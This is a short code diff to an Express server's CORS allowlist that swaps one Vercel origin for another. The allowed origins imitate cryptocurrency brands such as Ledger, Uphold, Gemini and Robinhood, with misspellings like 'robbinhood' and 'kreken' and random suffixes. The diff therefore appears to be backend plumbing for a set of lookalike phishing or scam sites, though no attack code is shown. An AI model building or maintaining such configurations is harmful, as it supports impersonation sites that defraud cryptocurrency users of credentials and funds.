@@ -15,7 +15,7 @@ app.use(cors({
         "https://i-trust-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
         "https://robbinhood-i-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
         "https://uphold-eight-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
-        "https://ledger-delta-three-woad-five-sigma-dfasf-324324-343244.vercel.app",
+        "https://ledger-delta-four-woad-five-sigma-dfasf-324324-343244.vercel.app",
         "https://gemini-ten-orpin-delta-three-woad-five-sigma-343244.vercel.app",
         "https://kreken-gamma-orpin-delta-three-woad-five-sigma-343244.vercel.app",
         "https://net-coin-xi-orpin-delta-three-woad-five-sigma-343244.vercel.app",
